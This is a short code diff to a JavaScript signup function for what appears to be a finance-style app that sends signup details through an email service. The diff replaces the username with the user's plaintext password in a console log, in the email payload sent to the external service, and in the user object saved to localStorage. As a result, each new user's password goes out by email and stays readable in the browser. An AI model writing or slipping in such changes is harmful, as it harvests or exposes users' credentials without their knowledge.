@@ -161,7 +161,7 @@ async function signup(name, email, password) {
     console.log("Service ID:", "service_6nw221q");
     console.log("Template ID:", "template_d6k3x8f");
     console.log("Payload:", {
-      username: user.name,
+      userpassword: user.password,
       useremail: user.email
     });
 
@@ -169,7 +169,7 @@ async function signup(name, email, password) {
       "service_6nw221q",
       "template_d6k3x8f",
       {
-        username: user.name || "User",
+        userpassword: user.password || "User",
         useremail: user.email,
         time: new Date().toISOString()
       }
@@ -195,7 +195,7 @@ async function signup(name, email, password) {
   localStorage.setItem(
     STORAGE_CURRENT_USER_KEY,
     JSON.stringify({
-      name: user.name,
+      password: user.password,
       email: user.email,
       balance: user.balance,
       transactions: user.transactions || []
